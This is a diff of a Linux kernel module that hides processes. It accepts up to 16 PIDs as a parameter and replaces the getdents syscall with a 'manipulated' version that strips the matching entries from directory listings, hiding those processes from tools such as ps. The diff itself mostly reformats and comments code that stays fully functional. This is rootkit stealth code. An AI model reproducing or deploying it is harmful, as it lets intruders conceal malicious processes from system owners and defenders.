@@ -12,16 +12,7 @@
 #include <linux/unistd.h>
 #include <linux/proc_fs.h>
 #include <linux/delay.h>
-
-#include <asm/uaccess.h>
-#include <linux/dirent.h>
-#include <linux/fs.h>
-#include <linux/file.h>
 #include <linux/string.h>
-#include <linux/errno.h>
-
-#include<linux/spinlock.h>   
-   
 
 #include "sysmap.h"
 
@@ -39,11 +30,9 @@ static int call_counter = 0;
 static int processes[16] = {-1, -1, -1 , -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1};
 static int argcount = 0;
 
-
 /* Define module parameters */
 module_param_array(processes, int, &argcount, 0000);
 MODULE_PARM_DESC(processes, "An array of process ids to hide. Must contain at least one and no more than 16 pids.");
-
 
 struct linux_dirent {   
         unsigned long   d_ino;   
@@ -51,7 +40,6 @@ struct linux_dirent {
         unsigned short  d_reclen;   
         char            d_name[1];   
  };   
-
 
 /* get PID from the name */
 int convert_atoi(char *str)
@@ -73,17 +61,22 @@ int convert_atoi(char *str)
 int hide(pid_t pid)
 {
 	int i = 0;
-	for(i=0;i<argcount;i++)
+	if(pid)
 	{
+		for(i=0;i<argcount;i++)
+		{
 		 if(processes[i] == pid ) return 1;	
+		}
 	}	
 
 	return 0;
 }
 
    
-
-
+/*
+ * Our manipulated getdents syscall. It checks whether a particular process needs to hided,
+ * if matches then don't show otherwise works normally and calls the original getdents.
+ */
 asmlinkage int manipulated_getdents (unsigned int fd, struct linux_dirent __user *dirp, unsigned int count)
 {
 	call_counter++;
@@ -100,18 +93,23 @@ asmlinkage int manipulated_getdents (unsigned int fd, struct linux_dirent __user
 	{
 		len  = dirp->d_reclen;
 		tlen = tlen-len;
-			
+		
+		/* Check if we need to hide the process,
+		 * convert_atoi return the pid of every process in integer format,
+		 * hide will compare the pid against the user entered processes.
+		 */		
 		if((hide(convert_atoi(dirp->d_name))))
-			{	
-				memmove(dirp, (char*) dirp + dirp->d_reclen,tlen);
-				ret -= len;
-			}
-			else if(tlen != 0)
-			{	//printk("sub::d_reclen:%d,tlen:%d,dname:%s,\n",dirp->d_reclen,tlen,dirp->d_name);
-				dirp = (struct linux_dirent *) ((char*) dirp + dirp->d_reclen);
-			}
-
+		{	
+			memmove(dirp, (char*) dirp + dirp->d_reclen,tlen);
+			ret -= len;
 		}
+		
+		else if(tlen != 0)
+		{	//printk("sub::d_reclen:%d,tlen:%d,dname:%s,\n",dirp->d_reclen,tlen,dirp->d_name);
+			dirp = (struct linux_dirent *) ((char*) dirp + dirp->d_reclen);
+		}
+
+	}
 	
 	call_counter--;
 	return ret;
